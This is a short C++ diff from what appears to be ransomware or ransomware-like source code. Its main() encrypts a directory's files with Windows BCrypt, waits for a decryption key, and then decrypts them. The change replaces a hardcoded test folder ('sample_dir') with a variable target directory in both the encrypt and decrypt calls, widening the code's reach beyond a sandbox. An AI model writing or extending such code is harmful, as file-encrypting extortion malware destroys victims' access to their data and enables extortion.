@@ -39,8 +39,7 @@ int main() {
 		return OPERATION_FAILED;
 	}
 
-	//traverse_dir(1, targetDir.c_str(), hAlgorithm, key, keyObjLen, true);
-	if (!traverse_dir(1, L"C:\\Users\\user\\sample_dir", hAlgorithm, iv, key, keyObjLen, true)) {
+	if (!traverse_dir(1, targetDir.c_str(), hAlgorithm, iv, key, keyObjLen, true)) {
 		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
 		return OPERATION_FAILED;
 	}
@@ -68,8 +67,7 @@ int main() {
 		}
 	} while (decrypted_key.size() == 0);
 
-	//traverse_dir(1, targetDir.c_str(), hAlgorithm, decrypted_key, keyObjLen, false);
-	if (!traverse_dir(1, L"C:\\Users\\user\\sample_dir", hAlgorithm, iv, decrypted_key, keyObjLen, false)) {
+	if (!traverse_dir(1, targetDir.c_str(), hAlgorithm, iv, decrypted_key, keyObjLen, false)) {
 		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
 		return OPERATION_FAILED;
 	}
